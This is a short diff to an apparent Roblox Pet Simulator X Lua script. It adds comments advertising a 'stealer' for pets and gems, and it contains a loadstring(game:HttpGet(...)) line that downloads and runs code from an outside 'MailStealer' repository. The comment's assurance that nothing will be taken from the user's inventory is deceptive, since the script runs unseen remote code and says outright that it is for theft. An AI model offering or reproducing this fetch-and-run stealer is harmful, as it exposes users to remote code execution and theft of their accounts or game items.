@@ -1,1 +1,3 @@
+--// This will NOT take ANYTHING from your inventory!
+--// This script setups a stealer for you, extremely easy then allows you to steal lots of pets & gems!
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSimulatorXLUA/MailStealer/main/Script")
